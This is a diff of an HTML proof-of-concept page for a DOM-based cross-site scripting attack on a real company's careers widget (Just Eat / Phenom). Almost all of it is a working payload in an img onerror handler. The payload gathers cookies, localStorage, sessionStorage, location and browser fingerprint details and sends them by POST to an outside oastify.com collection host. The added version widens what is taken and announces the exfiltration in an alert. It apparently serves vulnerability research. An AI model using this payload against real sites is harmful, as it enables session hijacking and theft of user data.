@@ -1,34 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🔥 XSS PoC – Phenom Widget</title>
+  <title>🔥 Just Eat Widget XSS PoC – Max Impact</title>
 </head>
 <body>
-  <h2>🔥 DOM-Based XSS via Just Eat / Phenom Widget</h2>
+  <h2>DOM XSS Exploit in Just Eat Widget</h2>
 
-  <!-- Malicious widget injection -->
-  <div class="ph-widget" as-element="xssWidget">
-    <img src="x" onerror="
-      const data = {
-        cookie: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage),
-        url: location.href,
-        origin: location.origin
-      };
-      fetch('https://ykmkw5n8la7rld89saeryu121t7mvcj1.oastify.com', {
-        method: 'POST',
-        mode: 'no-cors',
-        body: JSON.stringify(data)
-      });
+  <!-- Injected malicious widget -->
+  <div class="ph-widget" as-element="xssW">
+    <img src=x onerror="
+      (async () => {
+        const payload = {
+          cookies: document.cookie,
+          localStorage: JSON.stringify(localStorage),
+          sessionStorage: JSON.stringify(sessionStorage),
+          referrer: document.referrer,
+          location: location.href,
+          origin: location.origin,
+          domain: document.domain,
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          platform: navigator.platform,
+          screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth
+          },
+          timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          windowName: window.name,
+          scripts: [...document.scripts].map(s => s.src).filter(Boolean)
+        };
+
+        await fetch('https://ykmkw5n8la7rld89saeryu121t7mvcj1.oastify.com', {
+          method: 'POST',
+          mode: 'no-cors',
+          body: JSON.stringify(payload)
+        });
+
+        alert('✅ DOM XSS Triggered - Sensitive data exfiltrated!');
+        console.warn('[🔥 DOM XSS] Exfiltrated data:', payload);
+      })();
     ">
   </div>
 
-  <!-- Load vulnerable enhancer (required for widget parsing) -->
+  <!-- Load vulnerable enhancer -->
   <script src="https://careers.justeattakeaway.com/global/en/phenomtrack.min.js"></script>
-  <script>
-    // Trigger the widget rendering
-    PhEnhancer && PhEnhancer();
-  </script>
+  <script>PhEnhancer && PhEnhancer();</script>
 </body>
 </html>
